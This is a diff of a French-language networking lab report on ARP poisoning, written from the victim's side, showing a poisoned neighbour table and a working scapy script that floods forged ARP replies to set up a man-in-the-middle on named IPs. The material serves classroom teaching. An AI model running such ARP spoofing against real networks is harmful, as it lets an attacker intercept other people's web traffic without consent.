@@ -111,11 +111,22 @@ _gateway (192.168.11.46) at 96:24:c9:47:ee:dc [ether] on wlp3s0
 
 ### 3. Bonus : ARP poisoning
 
-
-```
+(Je suis la victime)
 
 ⭐ Empoisonner la table ARP de l'un des membres de votre réseau
 
+Avec le script ci dessous l'attaquant à empoisonner les informations de ma table ARP. L'IP
+qui est censé être celle du routeur est donc la sienne :
+
+```
+> ip n s
+172.20.10.4 dev wlp3s0 lladdr 90:e8:68:15:ac:43 STALE 
+172.20.10.1 dev wlp3s0 lladdr 90:e8:68:15:ac:43 REACHABLE 
+fe80::60d0:39ff:fef1:3f64 dev wlp3s0 lladdr 62:d0:39:f1:3f:64 router STALE 
+2a0d:e487:132f:e506:f40d:223a:e036:824e dev wlp3s0 lladdr 62:d0:39:f1:3f:64 router STALE 
+```
+
+```py
 from scapy.all import ARP, Ether, sendp, conf, getmacbyip
 
 def arp_poison(victim_ip, victim_mac, router_ip):
@@ -134,10 +145,11 @@ def arp_poison(victim_ip, victim_mac, router_ip):
     # Send the ARP response packet in a loop to keep poisoning the victim's ARP cache
     while True:
         sendp(packet, verbose=0)
-
+```
 
 ⭐ Mettre en place un MITM
 
+```py
 target_ip = "192.168.11.7"  # IP of the victim
 target_mac = "34-C9-3D-22-97-2D"  # MAC of the victim
 spoof_ip = "192.168.11.46"  # IP you want to spoof (usually the gateway)
@@ -149,3 +161,5 @@ spoof_ip2 = "192.168.11.46"  # IP you want to spoof (usually the gateway)
 arp_poison(target_ip, target_mac, spoof_ip)
 arp_poison(target_ip2, target_mac2, spoof_ip2)
 ```
+
+Il a pu dans ce cas là récupérer et voir mes requêtes vers les différents site web que je consultais.
